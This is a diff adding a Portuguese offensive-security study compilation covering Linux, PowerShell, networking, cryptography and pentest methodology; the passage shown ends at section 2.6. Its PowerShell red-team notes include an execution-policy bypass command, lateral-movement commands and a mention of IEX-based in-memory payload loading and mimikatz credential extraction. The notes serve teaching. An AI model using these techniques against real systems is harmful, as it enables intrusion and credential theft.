@@ -1,0 +1,2597 @@
+# Compilado de Conhecimento — Segurança Ofensiva, Pentest e Red Team
+
+> Material compilado e organizado a partir de ~160 fontes (anotações pessoais, slides de curso e PDFs de aula), estruturado por complexidade crescente, do fundamento à exploração avançada. Trechos de código de exploração funcional (shellcode, exploits binários completos) foram deliberadamente omitidos ou catalogados apenas por nome e propósito — este documento é material de estudo, não um pacote de ferramentas de ataque.
+
+## Sumário
+
+1. [Fundamentos](#fundamentos)
+   - [1.1 Segurança da Informação vs Cibersegurança](#11-segurança-da-informação-vs-cibersegurança)
+   - [1.2 Princípios de Segurança](#12-princípios-de-segurança)
+   - [1.3 Sistema Operacional e Linha de Comando (Linux)](#13-sistema-operacional-e-linha-de-comando-linux)
+   - [1.4 Shell Script](#14-shell-script)
+   - [1.5 Virtualização](#15-virtualização)
+   - [1.6 Fundamentos de Redes de Computadores](#16-fundamentos-de-redes-de-computadores)
+   - [1.7 Criptografia e Hash](#17-criptografia-e-hash)
+2. [Metodologia de Pentest e Red Team](#metodologia-de-pentest-e-red-team)
+   - [2.1 Cyber Kill Chain](#21-cyber-kill-chain)
+   - [2.2 Fases do Pentest (visão detalhada — CISCO)](#22-fases-do-pentest-visão-detalhada--cisco)
+   - [2.3 Modalidades de Pentest](#23-modalidades-de-pentest)
+   - [2.4 Offensive Mindset](#24-offensive-mindset)
+   - [2.5 Práticas Recomendadas de Segurança](#25-práticas-recomendadas-de-segurança-defesa-mas-essencial-conhecer)
+   - [2.6 Purple Team — Contexto e Fundamentos](#26-purple-team--contexto-e-fundamentos)
+   - [2.7 Liderança Aplicada à Segurança Ofensiva](#27-liderança-aplicada-à-segurança-ofensiva)
+   - [2.8 Fundamentos de Liderança](#28-fundamentos-de-liderança-referência-de-base)
+3. [Reconhecimento e Enumeração](#reconhecimento-e-enumeração)
+   - [3.1 Information Gathering (OSINT)](#31-information-gathering-osint)
+   - [3.2 Advanced Information Gathering](#32-advanced-information-gathering)
+   - [3.3 Enumeração de Subdomínios](#33-enumeração-de-subdomínios)
+   - [3.4 Descoberta de Conteúdo Web](#34-descoberta-de-conteúdo-web)
+   - [3.5 Ferramentas de Varredura de Domínio/Diretório](#35-ferramentas-de-varredura-de-domíniodiretório)
+   - [3.6 Scanning](#36-scanning)
+   - [3.7 Enumeração de Serviços](#37-enumeração-de-serviços)
+   - [3.8 Captura de Tráfego](#38-captura-de-tráfego)
+   - [3.9 Banco de Dados de Vulnerabilidades](#39-banco-de-dados-de-vulnerabilidades)
+   - [3.10 Ferramentas de Escaneamento de Vulnerabilidades](#310-ferramentas-de-escaneamento-de-vulnerabilidades)
+4. [Vulnerabilidades Web](#vulnerabilidades-web)
+   - [4.1 Visão Geral — OWASP Top 10 (2021)](#41-visão-geral--owasp-top-10-2021)
+   - [4.2 A01 — Quebra de Controle de Acesso (Broken Access Control)](#42-a01--quebra-de-controle-de-acesso-broken-access-control)
+   - [4.3 A02 — Falhas Criptográficas](#43-a02--falhas-criptográficas)
+   - [4.4 A03 — Injeção](#44-a03--injeção)
+   - [4.5 A04 — Design Inseguro](#45-a04--design-inseguro)
+   - [4.6 A05 — Configuração Incorreta de Segurança](#46-a05--configuração-incorreta-de-segurança)
+   - [4.7 A06 — Componentes Vulneráveis e Desatualizados](#47-a06--componentes-vulneráveis-e-desatualizados)
+   - [4.8 A07 — Falhas de Identificação e Autenticação](#48-a07--falhas-de-identificação-e-autenticação)
+   - [4.9 A08 — Falhas de Software e Integridade de Dados](#49-a08--falhas-de-software-e-integridade-de-dados)
+   - [4.10 A09 — Falhas de Monitoramento e Registro](#410-a09--falhas-de-monitoramento-e-registro)
+   - [4.11 A10 — SSRF (Server-Side Request Forgery)](#411-a10--ssrf-server-side-request-forgery)
+   - [4.12 OWASP API Security Top 10 (resumo)](#412-owasp-api-security-top-10-resumo)
+   - [4.13 Devtools — Aba Storage](#413-devtools--aba-storage-ferramenta-de-inspeção-no-navegador)
+5. [Ferramentas Ofensivas](#ferramentas-ofensivas)
+   - [5.1 Burp Suite](#51-burp-suite)
+   - [5.2 SQLMap](#52-sqlmap)
+   - [5.3 Hydra](#53-hydra)
+   - [5.4 John the Ripper / Hashcat](#54-john-the-ripper--hashcat)
+   - [5.5 Metasploit Framework](#55-metasploit-framework)
+   - [5.6 CyberChef](#56-cyberchef)
+   - [5.7 Outras ferramentas úteis](#57-outras-ferramentas-úteis-referência-rápida)
+6. [Exploração e Pós-Exploração](#exploração-e-pós-exploração)
+   - [6.1 Exploitation — Fundamentos](#61-exploitation--fundamentos)
+   - [6.2 Shells (Reverse, Bind, Web)](#62-shells-reverse-bind-web)
+   - [6.3 Pós-exploração — Linux](#63-pós-exploração--linux)
+   - [6.4 Pós-exploração — Windows](#64-pós-exploração--windows)
+   - [6.5 Comando e Controle (C2) e Botnets](#65-comando-e-controle-c2-e-botnets)
+7. [Exploração Binária (Avançado)](#exploração-binária-avançado)
+   - [7.1 Fundamentos de Arquitetura x86](#71-fundamentos-de-arquitetura-x86)
+   - [7.2 Buffer Overflow — Conceito](#72-buffer-overflow--conceito)
+   - [7.3 SEH Based Exploitation](#73-seh-based-exploitation)
+   - [7.4 Egg Hunter](#74-egg-hunter)
+   - [7.5 Catálogo de Scripts de Referência](#75-catálogo-de-scripts-de-referência-teoria-sem-reprodução-de-código-funcional)
+8. [Segurança de APIs](#segurança-de-apis)
+   - [8.1 API Basics](#81-api-basics)
+   - [8.2 OWASP API Security Top 10](#82-owasp-api-security-top-10)
+   - [8.3 Pentest API Tools](#83-pentest-api-tools)
+   - [8.4 Exploiting APIs](#84-exploiting-apis)
+9. [Blue Team / Defesa](#blue-team--defesa)
+   - [9.1 SOC (Security Operation Center)](#91-soc-security-operation-center)
+   - [9.2 SIEM (Security Information and Event Management)](#92-siem-security-information-and-event-management)
+   - [9.3 Firewall](#93-firewall)
+   - [9.4 IDS/IPS](#94-idsips)
+   - [9.5 Fundamentos de Logs](#95-fundamentos-de-logs)
+   - [9.6 Gestão de Vulnerabilidades (visão defensiva)](#96-gestão-de-vulnerabilidades-visão-defensiva)
+   - [9.7 Resposta a Incidentes](#97-resposta-a-incidentes-detalhamento)
+   - [9.8 Caso Prático de Detecção — CVE-2025-68613 (n8n)](#98-caso-prático-de-detecção--cve-2025-68613-n8n)
+10. [Forense Digital e Análise de Malware](#forense-digital-e-análise-de-malware)
+    - [10.1 Fundamentos de Forense Digital](#101-fundamentos-de-forense-digital)
+    - [10.2 Análise de Malware — Fundamentos](#102-análise-de-malware--fundamentos)
+    - [10.3 Análise Estática](#103-análise-estática)
+    - [10.4 Análise Dinâmica](#104-análise-dinâmica)
+    - [10.5 Técnicas de Proteção e Ofuscação de Malware](#105-técnicas-de-proteção-e-ofuscação-de-malware)
+    - [10.6 Ferramentas de Engenharia Reversa](#106-ferramentas-de-engenharia-reversa)
+    - [10.1 Forense Digital — Fundamentos (complementar)](#101-forense-digital--fundamentos)
+    - [10.2 Fundamentos de Malware](#102-fundamentos-de-malware)
+    - [10.3 Análise Estática (II)](#103-análise-estática-1)
+    - [10.4 Análise Dinâmica (II)](#104-análise-dinâmica-1)
+    - [10.5 Análise Avançada — Engenharia Reversa](#105-análise-avançada--engenharia-reversa)
+    - [10.6 Ofuscação de Malware](#106-ofuscação-de-malware)
+11. [Inteligência (OSINT / Cyber Intel)](#inteligência-osint--cyber-intel)
+    - [11.1 Contrainteligência e CTI](#111-contrainteligência-e-cti)
+    - [11.2 Ferramentas Avançadas de OSINT](#112-ferramentas-avançadas-de-osint)
+12. [IA Aplicada à Segurança Ofensiva](#ia-aplicada-à-segurança-ofensiva)
+    - [12.1 IA na Segurança Ofensiva e Defensiva](#121-ia-na-segurança-ofensiva-e-defensiva)
+    - [12.2 Ataques de Envenenamento (Data Poisoning)](#122-ataques-de-envenenamento-data-poisoning)
+    - [12.3 Fundamentos de Machine Learning Aplicados à Segurança](#123-fundamentos-de-machine-learning-aplicados-à-segurança)
+13. [Direito Digital e Aspectos Legais](#direito-digital-e-aspectos-legais)
+    - [13.1 Introdução ao Direito Digital](#131-introdução-ao-direito-digital)
+    - [13.2 Crimes Digitais — Lei 12.737/2012 (Lei Carolina Dieckmann)](#132-crimes-digitais--lei-127372012-lei-carolina-dieckmann)
+    - [13.3 Marco Civil da Internet — Lei 12.965/2014](#133-marco-civil-da-internet--lei-129652014)
+    - [13.4 LGPD — Lei Geral de Proteção de Dados (Lei 13.709/2018)](#134-lgpd--lei-geral-de-proteção-de-dados-lei-137092018)
+    - [13.5 Aspectos Jurídicos da Segurança da Informação](#135-aspectos-jurídicos-da-segurança-da-informação)
+    - [13.6 IA e Legislação — AI Act (UE) e PL 2338/2023 (Brasil)](#136-ia-e-legislação--ai-act-ue-e-pl-23382023-brasil)
+14. [Relatório e Comunicação](#relatório-e-comunicação)
+    - [14.1 Estrutura do Relatório de Pentest (PTES)](#141-estrutura-do-relatório-de-pentest-ptes)
+    - [14.2 Dicas de Escrita de Relatório](#142-dicas-de-escrita-de-relatório)
+15. [Gestão e Cultura](#gestão-e-cultura)
+16. [Apêndice](#apêndice)
+    - [A.1 Plataformas de Prática](#a1-plataformas-de-prática)
+    - [A.2 Recursos Online Essenciais](#a2-recursos-online-essenciais)
+    - [A.3 Catálogo Agrupado de Ferramentas](#a3-catálogo-agrupado-de-ferramentas)
+    - [A.4 Wordlists Padrão](#a4-wordlists-padrão)
+    - [A.5 Livros e Referências Bibliográficas](#a5-livros-e-referências-bibliográficas)
+    - [A.6 Referências Legais (Brasil)](#a6-referências-legais-brasil)
+
+---
+
+# Fundamentos
+
+*Nível: Básico. Pré-requisito para todo o resto do material.*
+
+## 1.1 Segurança da Informação vs Cibersegurança
+
+Cibersegurança é um segmento dentro do campo mais amplo de Segurança da Informação. A **tríade da Segurança da Informação** é formada por **Pessoas, Processos e Tecnologia** — e o elo mais frágil costuma ser o humano.
+
+Alguns mitos comuns: quanto mais seguro, mais "engessado"; privilégios devem ser mínimos; acessos restritos a administradores. Na prática, restringir demais o usuário pode prejudicar o negócio — a solução costuma ser conscientização (ex.: permitir instalar apenas programas de catálogos conhecidos) em vez de bloqueio total.
+
+A informação passa por um ciclo de vida: **criar → coletar → processar → armazenar → transmitir ou descartar**. Não saber o que acontece com a informação em cada etapa (nível de restrição, riscos, vulnerabilidades) é um risco em si.
+
+A norma **ISO/IEC 27002:2022** organiza controles em 4 categorias: Organizacionais (37), De Pessoas (8), Acesso Físico (14) e Tecnologia (34).
+
+### Conceito de Cibersegurança
+Cibersegurança é definida de formas diversas, mas convergem em: salvaguardar redes e informações contra intrusão, dano ou descontinuidade; reduzir o risco de ataques a softwares, computadores e redes; e um conjunto de ferramentas, políticas, treinamentos e tecnologias usados para proteger o ambiente cibernético. É mais abrangente do que apenas solução tecnológica — envolve também aspectos humanos e processuais.
+
+**Vetores de ataque** mais comuns (dados Hackmageddon 2021): Malware (39,4%), causas desconhecidas (18,7%), Account Takeover (13%) — apropriação de identidade (usuário/senha) para ações não autorizadas.
+
+## 1.2 Princípios de Segurança
+
+- **PIM (Privileged Identity Management)**: acesso mínimo que cada usuário individual deve receber conforme sua função.
+- **PAM (Privileged Access Management)**: gerenciamento dos privilégios que uma função/área possui — políticas de senha, auditoria, redução de superfície de ataque.
+- **Privilégio mínimo**: conceder apenas o necessário para a função.
+
+### Modelagem de ameaças (STRIDE)
+Processo de revisão e teste de protocolos de segurança, incluindo: preparação, identificação, mitigação e análise.
+
+| Ameaça | Descrição |
+|---|---|
+| **S**poofing | Falsificação de identidade — remediado com chaves de API, assinaturas criptográficas |
+| **T**ampering | Adulteração de dados — medidas antiadulteração garantem integridade |
+| **R**epudiation | Rejeição de ameaças — uso de logs de atividade |
+| **I**nformation disclosure | Divulgação de informação — mostrar apenas o relevante ao dono |
+| **D**enial of Service | Negação de serviço — proteger recursos contra abuso |
+| **E**levation of privilege | Elevação de privilégio — pior cenário, usuário escala para admin |
+
+Metodologia **PASTA**: processo de simulação de ataques e análise de ameaças.
+
+### Resposta a Incidentes — 6 fases (SANS, também usada pelo NIST)
+"PICERL": **P**reparação → **I**dentificação → **C**ontenção → **E**rradicação → **R**ecuperação → **L**ições Aprendidas.
+
+Uma violação de segurança é um **incidente**; a equipe que responde é a **CSIRT** (Computer Security Incident Response Team).
+
+## 1.3 Sistema Operacional e Linha de Comando (Linux)
+
+Sistema Operacional: software que gerencia hardware, aplicativos e recursos do sistema.
+- **Espaço do Kernel**: área privilegiada com acesso direto ao hardware.
+- **Espaço do usuário**: aplicativos comuns, permissões limitadas.
+- **GUI** vs **CLI**: interface gráfica vs linha de comando.
+
+Estrutura de diretórios (FHS — Filesystem Hierarchy Standard):
+- `/etc` → arquivos de configuração
+- `/dev/root` → disco principal
+- `tmpfs` → sistema de arquivos temporário em RAM
+- `/dev/shm` → memória compartilhada
+- `/var/log` → logs do sistema (`auth.log` = tentativas de autenticação; `syslog`)
+
+### Comandos essenciais de gerenciamento de processos
+```
+ps            # processos em execução
+ps -e         # todos os processos do sistema
+ps -ef        # informações detalhadas
+kill [PID]    # encerra processo; kill -9 força
+killall nome  # encerra todos processos de um programa
+top           # monitor de processos em tempo real
+jobs / fg / bg  # processos em foreground/background
+pstree        # árvore de processos
+locate / updatedb  # busca de arquivos por nome (banco indexado)
+which cmd     # caminho do executável
+dmesg         # log de inicialização
+tail -f arq   # acompanha arquivo em tempo real
+```
+
+Conexão remota: `ssh -X usuario@ip` (X forwarding gráfico — o que for executado graficamente roda na máquina remota, exibindo na local).
+
+Transferência de arquivos com `scp` (Secure Copy, usa SSH):
+```
+# Local → Remoto (enviar arquivo para a máquina remota)
+scp arquivo usuario@ip:/diretorio/destino
+
+# Remoto → Local (baixar arquivo da máquina remota para a local — útil em pós-exploração)
+scp usuario@ip:/caminho/arquivo_remoto /diretorio/local/
+
+# Copiar diretório inteiro (flag -r)
+scp -r usuario@ip:/diretorio_remoto/ /diretorio_local/
+```
+
+
+### Expressões Regulares (REGEX) e manipulação de texto
+Essencial para análise de logs e CTFs.
+
+```
+grep [opções] regex arquivo     # filtra linhas por padrão
+egrep                           # grep + metacaracteres +,?,|,()
+fgrep                           # busca literal (sem regex), mais rápido
+sed [opções] {script}           # edição/transformação de texto
+```
+
+Exemplos práticos:
+```
+grep '^1' access.log                 # linhas começando com 1
+grep '^[aeiou]' access.log           # linhas começando com vogal
+egrep -i '.m.a' access.log           # 2ª letra m, 4ª letra a (qualquer caractere = '.')
+sed -n '/http/p' access.log          # linhas contendo "http"
+sed -n '/http/p' access.log | egrep -i -v "Mozilla|dirbuster"  # suprime termos
+for i in {1..100}; do echo $i >> narq.txt; done     # gerar sequência
+for i in $(cat narq.txt); do total=$((2*$i)); echo $total; done  # processar linha a linha
+```
+
+Regex são úteis para validar/buscar: IPs, e-mails, URLs, dados entre tags HTML, CPF/CNPJ, datas.
+
+## 1.4 Shell Script
+
+Um script shell começa com **shebang** (`#!/bin/bash`), informando o interpretador. Linhas com `#` são comentários.
+
+```bash
+#!/bin/bash
+#Meu script
+echo "Hello World"
+```
+
+Tornar executável: `chmod 755 script.sh` (todos podem executar) ou `700` (só o dono). Executar: `./script.sh`.
+
+Locais convencionais: `~/bin` (scripts pessoais), `/usr/local/bin` (uso geral), `/usr/local/sbin` (administração). Para rodar de qualquer lugar, adicionar ao `PATH` em `/etc/profile`.
+
+### Condicionais
+```bash
+if [ CONDICAO ]; then
+  AÇÃO
+fi
+```
+Operadores aritméticos: `-eq` (igual), `-ne` (diferente), `-lt` (menor), `-le` (menor-igual), `-gt` (maior), `-ge` (maior-igual).
+Operadores de arquivo: `-s` (não vazio), `-f` (existe e não é pasta), `-d` (é pasta), `-w` (gravável), `-r` (leitura), `-x` (executável).
+
+Entrada de usuário: `read variavel`. Scripts podem ser aninhados (`if` dentro de `if`).
+
+### PowerShell (Windows)
+Plataforma Microsoft baseada em .NET para automação e administração do Windows. Orientada a objetos — cada comando retorna um objeto, não apenas texto. Relevante para red team como vetor de **Living off the Land (LotL)**: usa ferramentas nativas do SO sem deixar artefatos adicionais.
+
+**Convenção Verb-Noun (Cmdlets):**
+```powershell
+Get-Service                                          # lista todos os serviços
+Get-Service -Name "ByteBank" -ComputerName "SRV01"  # serviço específico em host remoto
+Get-Command                                          # lista todos os cmdlets disponíveis
+Get-Help Get-Service -Full                           # documentação completa
+```
+
+**Variáveis e pipeline:**
+```powershell
+$servico = Get-Service -Name GamingServices          # armazenar em variável
+$servico | Get-Member                                # inspecionar métodos e propriedades
+
+# Listar arquivos recursivamente filtrando por nome e exibindo tamanho em KB
+gci -Recurse -File | Where-Object Name -like "*_script_*" | Select-Object Name, Length
+
+# Convenção: FILTER LEFT, FORMAT RIGHT (melhor performance)
+gci -Recurse -File | ? Name -Like "*_script_*" | Select-Object Name, Length
+```
+
+**Enumeração e reconhecimento pós-exploração:**
+```powershell
+Get-Service                                          # todos os serviços + status
+Get-Process                                          # processos em execução
+Get-LocalUser                                        # usuários locais
+Get-LocalGroup                                       # grupos locais
+Get-NetIPConfiguration                               # configuração de rede
+Get-ChildItem C:\Users -Recurse -File                # arquivos recursivos
+$env:computername                                    # hostname da máquina
+```
+
+**Execução remota (lateral movement):**
+```powershell
+# Abrir sessão remota interativa
+New-PSSession -ComputerName SERVIDOR01
+Enter-PSSession -ComputerName SERVIDOR01
+
+# Executar bloco de código em sessão existente
+$sess = New-PSSession -ComputerName SERVIDOR01
+Invoke-Command -Session $sess -ScriptBlock { Get-Service }
+
+# Criar mapeamento de drive remoto (acesso ao sistema de arquivos)
+New-PSDrive -Root \\SERVIDOR01\D$\ -Name G -PSProvider FileSystem
+```
+
+**Jobs — execução paralela em background:**
+```powershell
+$job = Start-Job -ScriptBlock { Get-Process }
+Receive-Job -Job $job    # coletar resultado
+Remove-Job -Job $job
+```
+
+**Exportação de resultados:**
+```powershell
+Get-Service | ConvertTo-Json | Out-File relatorio.json
+Get-Service | ConvertTo-Csv -NoTypeInformation | Out-File relatorio.csv
+Get-Service | ConvertTo-Html -Title "Relatório" | Out-File relatorio.html
+```
+
+**CmdLet vs Função:**
+| | CmdLet | Função |
+| --- | --- | --- |
+| Implementação | Compilado em .NET (C#/F#) | Script PowerShell |
+| Performance | Alta — otimizado para volumes grandes | Adequada para tarefas simples |
+| Uso ideal | Tarefas complexas, integração .NET, produção | Automação rápida, prototipagem, scripts pontuais |
+
+**Red team — contexto ofensivo:**
+- **LotL (Living off the Land):** `Invoke-Command`, `New-PSSession`, `Get-WmiObject` são nativos — não requerem binários externos.
+- **Bypass de política de execução por sessão:** `powershell.exe -ExecutionPolicy Bypass -File script.ps1`
+- **Carregamento em memória:** scripts podem ser executados sem gravar em disco via `IEX (Invoke-Expression)` + download de payload.
+- **Detecção:** logs de PowerShell (Event ID 4103/4104 — Script Block Logging) são monitorados em ambientes maduros (ver Seção 9.5).
+
+## 1.5 Virtualização
+
+Camada de abstração sobre o hardware físico, permitindo dividir recursos (CPU, RAM, disco) em uma ou mais **máquinas virtuais (VMs)** independentes, cada uma com seu próprio SO.
+
+### Hypervisors
+- **Tipo 1 (Bare Metal)**: instalado direto no hardware, sem SO subjacente. Usado em datacenters corporativos. Mais eficiente.
+- **Tipo 2 (Hosted)**: instalado como aplicativo sobre um SO hospedeiro. Mais fácil de configurar (reaproveita rede/armazenamento do host), mas menos eficiente e com mais pontos de falha (reiniciar o host derruba todas as VMs).
+
+Funções básicas do hypervisor: fornecer ambiente idêntico ao físico; custo mínimo de desempenho; reter controle total dos recursos do sistema.
+
+## 1.6 Fundamentos de Redes de Computadores
+
+### Modelo em camadas (OSI x TCP/IP)
+Modelos em camadas distribuem as etapas de transmissão de mensagens, fazendo com que protocolos se responsabilizem por funções específicas de sua camada, evitando gargalos. Cada camada aproveita recursos da camada abaixo e fornece recursos à camada acima.
+
+- **Modelo de protocolo** (ex: TCP/IP): corresponde à estrutura de uma suíte específica de protocolos — descreve o que de fato ocorre.
+- **Modelo de referência** (ex: OSI): descreve o que precisa ser feito em cada camada, sem prescrever como — oferece consistência entre diferentes tipos de protocolo.
+
+O modelo TCP/IP (criado nos anos 1970, também chamado "modelo de Internet") é um padrão aberto, discutido publicamente via RFCs, não controlado por uma única empresa.
+
+Mapeamento OSI → TCP/IP: camadas 1-2 (física/enlace) do OSI → acesso à rede; camada 3 (rede) → camada Internet; camada 4 (transporte) → transporte; camadas 5-7 (sessão/apresentação/aplicação) → aplicação.
+
+### Encapsulamento e Segmentação
+Transmitir uma mensagem inteira como um fluxo contínuo bloquearia a rede para outros dispositivos e, se um link falhasse, toda a mensagem se perderia. Por isso os dados são divididos em **segmentos** menores, o que permite:
+- **Multiplexação**: várias conversas diferentes intercaladas na mesma rede.
+- Maior eficiência: só as partes perdidas precisam ser retransmitidas.
+
+Em cada camada, informações de protocolo são adicionadas aos dados — processo de **encapsulamento**. O formato que os dados assumem em cada camada é a **PDU (Protocol Data Unit)**.
+
+Endereços de camada de rede (IP) entregam o pacote da origem ao destino final (mesma rede ou remota). Endereços de camada de enlace (MAC) entregam o quadro de uma NIC a outra na mesma rede local.
+
+### Handshake Triplo (TCP)
+1. Cliente envia pacote com bit **SYN** (início da conexão).
+2. Servidor responde com **SYN + ACK**.
+3. Cliente responde com **ACK**, confirmando o estabelecimento.
+
+Garante transmissão confiável — dados perdidos ou corrompidos são reenviados.
+
+### Protocolos de Rede (resumo por camada/porta)
+
+| Protocolo | Camada | Porta | Função |
+|---|---|---|---|
+| TELNET | 7 (App) | 23 | Conexão remota (texto puro, inseguro) |
+| SSH | 7 | 22 | Conexão remota segura; base do SFTP |
+| DHCP | 7 | — | Distribui IPs (fluxo DORA: Discover, Offer, Request, Acknowledge) |
+| ARP | 3 (Rede) | — | Traduz IP → MAC |
+| ICMP | 3 | — | Diagnóstico (ping, traceroute) |
+| NAT | 3 | — | Traduz endereços privados ↔ público |
+| WHOIS | 7 | — | Dados de registro de domínio |
+| DNS | 7 | 53 (TCP/UDP) | Traduz nome de domínio ↔ IP (tipos A, AAAA, CNAME, MX) |
+| HTTP/HTTPS | 7 | 80/443 (8080/8443) | Comunicação navegador-servidor |
+| FTP | 7 | 21 | Transferência de arquivos (comandos USER, PASS, RETR, STOR) |
+| SMTP | 7 | 25 | Envio de e-mail (HELO/EHLO, MAIL FROM, RCPT TO, DATA) |
+| POP3 | 7 | 110 | Recupera e-mail (um dispositivo só) |
+| IMAP | 7 | 143 | Sincroniza e-mail entre vários dispositivos |
+| TLS/SSL | 4 (Transporte) | — | Criptografia (HTTP→HTTPS, POP3→POP3S etc.) |
+
+Portas seguras: HTTPS 443, POP3S 995, SMTPS 465/587, IMAPS 993, FTPS 990, SSH/SFTP 22.
+
+**VPN**: "V" (virtual) usa a infraestrutura pública da internet para conectar redes geograficamente distantes; "P" (private) garante confidencialidade e integridade dos dados que entram/saem.
+
+### Serviços de Rede — SMB
+**SMB (Server Message Block)**: protocolo cliente-servidor de compartilhamento de arquivos/impressoras, baseado em NetBIOS sobre TCP/IP. **Samba** é a implementação open-source para Linux/Unix, compatível com Windows, permitindo diretórios de usuário acessíveis via rede e cotas de disco configuráveis.
+
+## 1.7 Criptografia e Hash
+
+### Conceitos básicos
+- **Texto simples**: conteúdo legível.
+- **Texto cifrado**: conteúdo após criptografado.
+- **Cifra**: algoritmo usado para criptografar/descriptografar.
+- **Chave**: valor usado no processo.
+- **Criptoanálise**: estudo de métodos para quebrar criptografia sem conhecer a chave.
+- Ataques comuns: **força bruta** (testar todas as chaves possíveis) e **dicionário** (testar palavras comuns).
+
+### Tipos
+- **Simétrica** (chave privada): mesma chave cripto/descripto. Ex: DES, 3DES, AES.
+- **Assimétrica** (chave pública): par de chaves — pública criptografa, privada descriptografa. Ex: RSA, Diffie-Hellman, ECC.
+
+**RSA**: baseado na dificuldade de fatorar um número grande, produto de dois primos.
+- **Chave pública** = (n, e)
+- **Chave privada** = (n, d)
+- **Criptografa**: c = m^e mod n
+- **Descriptografa**: m = c^d mod n
+
+**Diffie-Hellman**: permite duas partes estabelecerem um segredo compartilhado em canal inseguro, sem troca prévia de segredo. Usa variáveis públicas (p primo, g gerador) e chaves privadas individuais; a chave final é calculada por ambos os lados chegando ao mesmo valor.
+
+Cálculo (exemplo com Alice e Bob):
+1. Parâmetros públicos acordados: **p** (número primo grande) e **g** (gerador, raiz primitiva de p)
+   > Combinados e conhecidos por todos — não são segredo.
+
+2. Alice escolhe chave privada **a** e calcula sua chave pública, enviando-a a Bob:
+   > `A = g^a mod p`
+
+3. Bob escolhe chave privada **b** e calcula sua chave pública, enviando-a a Alice:
+   > `B = g^b mod p`
+
+4. Alice calcula o segredo compartilhado usando a chave pública de Bob:
+   > `s = B^a mod p`
+
+5. Bob calcula o segredo compartilhado usando a chave pública de Alice:
+   > `s = A^b mod p`
+6. Ambos chegam ao mesmo valor: **s = g^(a×b) mod p**
+
+Um observador passivo que veja p, g, A e B não consegue calcular `s` sem resolver o **problema do logaritmo discreto** — computacionalmente inviável para valores grandes de p.
+
+**SSH** usa por padrão chaves RSA para autenticação. `ssh-keygen` gera chaves com algoritmos como DSA, ECDSA, ECDSA-SK, ED25519, ED25519-SK.
+
+**PGP/GPG**: implementações de criptografia de arquivo, assinatura digital e confidencialidade de e-mail. Chaves privadas protegidas por senha podem ser quebradas com John the Ripper + gpg2john.
+
+### Função Hash
+Diferente de criptografia: não há chave, e não deve ser possível reverter a saída para a entrada. Entrada de qualquer tamanho → saída de tamanho fixo. Usado para integridade (1 bit alterado = hash totalmente diferente) e senhas.
+
+- **Rainbow table**: tabela pré-computada de hashes para textos simples, permitindo descobrir senhas rapidamente.
+- **Salt**: prefixo/sufixo aleatório adicionado antes do hash, aumentando a segurança.
+- Funções seguras atuais: **Argon2, Scrypt, Bcrypt, PBKDF2**. Evitar MD5/SHA1 (obsoletos).
+- Linux: hashes em `/etc/shadow` (formato `$prefixo$opções$salt$hash`), legível só por root.
+- Windows: senhas em **NTLM** (variante do MD4), armazenadas no **SAM**; divididas em hashes NT e LM. Ferramentas como `mimikatz` tentam extraí-las.
+
+**HMAC** (Keyed-Hash Message Authentication Code): combina hash criptográfico com chave secreta para verificar autenticidade e integridade. `HMAC(K,M) = H((K⊕opad) || H((K⊕ipad) || M))`.
+
+### Assinatura Digital
+Combina função hash + criptografia assimétrica para garantir **autenticidade**, **integridade** e **não repúdio** de uma mensagem/documento.
+
+
+---
+
+# Metodologia de Pentest e Red Team
+
+*Nível: Básico/Intermediário.*
+
+## 2.1 Cyber Kill Chain
+
+Framework que descreve as etapas de um ataque, do reconhecimento à exfiltração:
+
+1. **Reconhecimento**: buscar em fontes públicas (redes sociais) informações sobre o alvo.
+2. **Armamento**: criar um payload/isca (site, e-mail, arquivo) baseado no que foi levantado.
+3. **Entrega**: meio pelo qual o armamento chega à vítima.
+4. **Exploração**: ativação do armamento pela vítima.
+5. **Instalação/Persistência**: manter acesso mesmo com desconexões (backdoors).
+6. **Comando e Controle**: canais para comandar a máquina da vítima (ex: HTTP/HTTPS).
+7. **Ações sobre Objetivos/Exfiltração**: coleta e exportação de dados, escalonamento de privilégios.
+
+Etapas gerais de metodologia de Pentest (visão resumida):
+1. Coleta de informação
+2. Enumeração / Varredura
+3. Exploração
+4. Escalação de privilégios
+5. Pós-exploração
+
+## 2.2 Fases do Pentest (visão detalhada — CISCO)
+
+1. **Planejamento**: coleta de informações, pesquisa de vulnerabilidades, reconhecimento passivo/ativo.
+2. **Varredura**: reconhecimento ativo — varredura de porta, verificação de vulnerabilidades, enumeração.
+3. **Obter acesso**: exploração via payload, engenharia social, vulnerabilidades web/software, quebra de Wi-Fi.
+4. **Manter acesso**: backdoors, trojans, rootkits — sem ser detectado, coletando dados valiosos.
+5. **Análise e relatório**: recomendações de produtos, políticas e treinamento.
+
+Variante alternativa (6 fases):
+1. Definição do escopo
+2. Coleta de informações
+3. Análise de vulnerabilidades
+4. Exploração
+5. Pós-exploração
+6. Relatório
+
+### Exemplo prático aplicado (estudo de caso real)
+1. Enumeração é fundamental — vulnerabilidades só são detectadas porque houve tempo dedicado a mapear estrutura, cabeçalhos, endpoints.
+2. Pequenos defeitos se acumulam: IDOR + redefinição de senha fraca + bypass de upload, isolados, parecem triviais, mas juntos geram comprometimento total.
+3. Restrições client-side não são segurança real — validação precisa ser sempre no servidor, com lista de permissões.
+4. Mecanismos de redefinição de senha merecem atenção redobrada (um único erro de design pode levar a account takeover).
+5. Pensar como atacante, relatar como consultor — a documentação clara com severidade e recomendações é o que agrega valor ao cliente.
+
+## 2.3 Modalidades de Pentest
+
+- **Black Box**: testador não possui informações prévias sobre o alvo — simula um atacante externo.
+- **White Box**: testador tem acesso total a código-fonte, arquitetura e credenciais — avaliação profunda.
+- **Grey Box**: conhecimento parcial — equilíbrio entre realismo e profundidade.
+
+## 2.4 Offensive Mindset
+
+Segurança Ofensiva compreende Análise de Vulnerabilidades, Pentest e Red Teaming — com profundidade e escopo crescentes nessa ordem. O pentest busca não apenas encontrar falhas, mas validar sua explorabilidade real e o impacto no negócio.
+
+## 2.5 Práticas Recomendadas de Segurança (defesa, mas essencial conhecer)
+
+1. Avaliação de risco (saber o valor do que se protege).
+2. Política de segurança clara (regras, responsabilidades).
+3. Segurança física (acesso a servidores/armários de rede).
+4. Verificação de antecedentes de RH.
+5. Backups regulares e testados.
+6. Patches e atualizações constantes.
+7. Controles de acesso e autenticação forte.
+8. Testes de resposta a incidentes.
+9. Monitoramento e gerenciamento de rede (SIEM/DLP).
+10. Dispositivos de segurança de rede (firewalls de última geração).
+11. Proteção de endpoint (antimalware empresarial).
+12. Treinamento de usuários.
+13. Criptografia de dados sensíveis, incluindo e-mail.
+
+## 2.6 Purple Team — Contexto e Fundamentos
+
